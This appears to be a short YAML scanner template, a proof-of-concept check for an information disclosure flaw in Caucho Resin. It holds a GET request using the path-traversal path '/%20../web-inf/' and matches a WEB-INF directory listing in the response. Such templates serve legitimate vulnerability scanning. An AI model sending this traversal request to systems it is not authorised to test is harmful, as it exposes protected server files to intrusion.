id: poc-yaml-caucho-resin-info-disclosure
info:
  name: Caucho Resin 信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: ''
requests:
- method: GET
  path: /%20../web-inf/
  expression: 'status_code == 200 &&

    contains(body,"/ ../web-inf/") &&

    contains(body,"Directory of /")

    '
variables: {}
transport: http
